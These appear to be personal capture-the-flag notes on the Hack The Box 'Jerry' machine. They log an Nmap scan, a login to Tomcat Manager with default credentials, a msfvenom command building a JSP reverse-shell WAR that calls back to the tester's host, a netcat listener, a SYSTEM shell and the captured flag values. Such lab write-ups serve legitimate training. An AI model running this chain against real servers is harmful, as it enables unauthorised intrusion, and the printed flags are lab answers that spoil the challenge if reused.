# Enumeration

## Nmap scan
```
nmap -sC -sV -Pn jerry.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 01:15 EST
Nmap scan report for jerry.htb (10.129.210.31)
Host is up (0.18s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.41 seconds
```

## Feroxbuster


## http - TCP port 8080

access to `http://jerry.htb:8080`

apache tomcat 7.0.88 shows up
![[Pasted image 20230213152928.png]]

There is a login prompt in Manater App

### Trying default password
https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

tomcat:s3cret

### Upload file
![[Pasted image 20230214092623.png]]

WAR file can be uploaded?


# Foothold

## Create reverse shell

### msfvenom
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > revshell.war
```

## Get shell

- Upload this revshell file in Tomcat
- Setup nc `nc -lnvp 4444 `
- Click on the /revshell

```
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

## Get flags
```
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```